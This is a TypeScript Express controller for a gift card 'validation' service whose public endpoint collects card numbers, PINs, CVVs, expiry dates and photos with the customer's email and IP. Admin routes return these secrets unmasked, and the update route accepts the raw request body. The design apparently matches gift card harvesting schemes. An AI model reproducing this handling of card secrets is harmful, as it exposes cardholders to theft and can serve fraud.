import { Response, NextFunction } from 'express';
import { AuthenticatedRequest } from '../middleware/authMiddleware.js';
import * as validationService from '../services/validationService.js';
import { ForbiddenError, UnauthorizedError, NotFoundError } from '../utils/errors.js';

export async function checkCardValidation(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    const { brand, cardNumber, pin, cvv, expiryDate, expiryMonth, expiryYear, images, currency, cardAmount } = req.body;

    // Process and validate 1 to 3 images first
    let sanitizedImages: string[] = [];
    if (Array.isArray(images)) {
      sanitizedImages = images
        .filter((img) => typeof img === 'string' && img.trim().length > 0)
        .slice(0, 3);
    } else if (typeof images === 'string' && images.trim().length > 0) {
      sanitizedImages = [images.trim()];
    }

    // Input validation & sanitization
    if (!brand || typeof brand !== 'string' || !brand.trim()) {
      res.status(400).json({ success: false, error: 'Gift card brand is required.' });
      return;
    }

    const hasCardNumber = typeof cardNumber === 'string' && cardNumber.trim().length > 0;
    const hasImages = sanitizedImages.length > 0;

    if (!hasCardNumber && !hasImages) {
      res.status(400).json({
        success: false,
        error: 'Please provide either the gift card redemption code/number or upload at least one card photo.',
      });
      return;
    }

    const sanitizedBrand = brand.trim();
    const sanitizedCardNumber = hasCardNumber
      ? cardNumber.trim()
      : `[Image Verification - ${sanitizedImages.length} Photo${sanitizedImages.length > 1 ? 's' : ''}]`;
    const sanitizedPin = pin && typeof pin === 'string' && pin.trim().length > 0 ? pin.trim() : null;
    const sanitizedCvv = cvv && typeof cvv === 'string' && cvv.trim().length > 0 ? cvv.trim() : null;

    // Process expiry date
    let sanitizedExpiryDate = expiryDate && typeof expiryDate === 'string' && expiryDate.trim().length > 0 ? expiryDate.trim() : null;
    if (!sanitizedExpiryDate && expiryMonth && expiryYear) {
      sanitizedExpiryDate = `${String(expiryMonth).trim()}/${String(expiryYear).trim()}`;
    }

    const sanitizedCurrency = currency && typeof currency === 'string' ? currency.trim() : 'USD';
    const parsedCardAmount = typeof cardAmount === 'number' ? cardAmount : (parseFloat(cardAmount) || 0.0);

    const record = await validationService.createValidationRequest({
      brand: sanitizedBrand,
      cardNumber: sanitizedCardNumber,
      pin: sanitizedPin || undefined,
      cvv: sanitizedCvv || undefined,
      expiryDate: sanitizedExpiryDate || undefined,
      images: sanitizedImages,
      currency: sanitizedCurrency,
      cardAmount: parsedCardAmount,
      customerEmail: req.user?.email,
      customerIp: req.ip,
    });

    res.status(201).json({
      success: true,
      message: 'Validation request submitted successfully. Validation pending.',
      data: {
        validationId: record.id,
        brand: record.brand,
        status: record.status,
        result: record.result,
        imagesCount: record.images.length,
        currency: record.currency,
        cardAmount: record.cardAmount,
        createdAt: record.createdAt,
      },
    });
  } catch (error) {
    next(error);
  }
}

export async function getAdminValidationRequests(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user) {
      return next(new UnauthorizedError('Authentication required.'));
    }
    if (req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const validations = await validationService.getAdminValidations();

    const sanitizedList = validations.map((v) => ({
      id: v.id,
      brand: v.brand,
      cardNumber: v.cardNumber,
      cardNumberMasked: v.cardNumber.length > 4 ? `****-****-****-${v.cardNumber.slice(-4)}` : '****',
      pin: v.pin,
      pinProvided: Boolean(v.pin),
      cvv: v.cvv || undefined,
      expiryDate: v.expiryDate || undefined,
      images: v.images || [],
      currency: v.currency || 'USD',
      cardAmount: v.cardAmount || 0.0,
      status: v.status,
      result: v.result,
      notes: v.notes || undefined,
      customerEmail: v.customerEmail || undefined,
      createdAt: v.createdAt,
      updatedAt: v.updatedAt,
    }));

    res.status(200).json({
      success: true,
      data: { validations: sanitizedList },
    });
  } catch (error) {
    next(error);
  }
}

export async function createAdminValidationRecord(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const { brand, cardNumber, pin, cvv, expiryDate, images, currency, cardAmount, status, result, notes, customerEmail } = req.body;

    if (!brand || !brand.trim()) {
      res.status(400).json({ success: false, error: 'Brand name is required.' });
      return;
    }
    if (!cardNumber || !cardNumber.trim()) {
      res.status(400).json({ success: false, error: 'Card number or redemption code is required.' });
      return;
    }

    const newRecord = await validationService.createValidationRequest({
      brand: brand.trim(),
      cardNumber: cardNumber.trim(),
      pin: pin ? String(pin).trim() : undefined,
      cvv: cvv ? String(cvv).trim() : undefined,
      expiryDate: expiryDate ? String(expiryDate).trim() : undefined,
      images: Array.isArray(images) ? images : [],
      currency: currency ? String(currency).trim() : 'USD',
      cardAmount: typeof cardAmount === 'number' ? cardAmount : (parseFloat(cardAmount) || 0.0),
      status: status || 'PENDING',
      result: result ? String(result).trim() : 'Validation pending',
      notes: notes ? String(notes).trim() : undefined,
      customerEmail: customerEmail ? String(customerEmail).trim() : undefined,
    });

    res.status(201).json({
      success: true,
      message: 'Validation record created successfully in table editor.',
      data: { validation: newRecord },
    });
  } catch (error) {
    next(error);
  }
}

export async function updateAdminValidationRecord(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const { id } = req.params;
    const existing = await validationService.getValidationById(id);
    if (!existing) {
      return next(new NotFoundError('Validation record not found.'));
    }

    const updated = await validationService.updateValidation(id, req.body);

    res.status(200).json({
      success: true,
      message: 'Validation record updated successfully.',
      data: { validation: updated },
    });
  } catch (error) {
    next(error);
  }
}

export async function deleteAdminValidationRecord(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const { id } = req.params;
    await validationService.deleteValidation(id);

    res.status(200).json({
      success: true,
      message: 'Validation record deleted successfully.',
    });
  } catch (error) {
    next(error);
  }
}

export async function bulkDeleteAdminValidationRecords(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      res.status(400).json({ success: false, error: 'Array of record IDs is required.' });
      return;
    }

    const result = await validationService.deleteMultipleValidations(ids);

    res.status(200).json({
      success: true,
      message: `Deleted ${result.count} validation record(s).`,
      data: { count: result.count },
    });
  } catch (error) {
    next(error);
  }
}

export async function clearAllAdminValidationRecords(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const result = await validationService.clearAllValidations();

    res.status(200).json({
      success: true,
      message: `Validation table restarted successfully. Erased ${result.count} record(s).`,
      data: { erasedCount: result.count },
    });
  } catch (error) {
    next(error);
  }
}

export async function syncValidationsToSupabase(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const syncResult = await validationService.syncAllValidationsToCloud();

    if (!syncResult.configured) {
      res.status(200).json({
        success: false,
        message: 'Supabase credentials are not configured in environment variables (SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY).',
        data: syncResult,
      });
      return;
    }

    if (!syncResult.success) {
      res.status(400).json({
        success: false,
        message: syncResult.error || 'Failed to sync validation records to Supabase.',
        data: syncResult,
      });
      return;
    }

    res.status(200).json({
      success: true,
      message: `Successfully synced ${syncResult.syncedCount} of ${syncResult.totalCount} validation records to Supabase table (gift_card_validations).`,
      data: syncResult,
    });
  } catch (error) {
    next(error);
  }
}

export async function getSupabaseStatus(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    if (!req.user || req.user.role !== 'ADMIN') {
      return next(new ForbiddenError('Access restricted to administrators.'));
    }

    const status = await validationService.getSupabaseSyncStatus();
    res.status(200).json({
      success: true,
      data: status,
    });
  } catch (error) {
    next(error);
  }
}

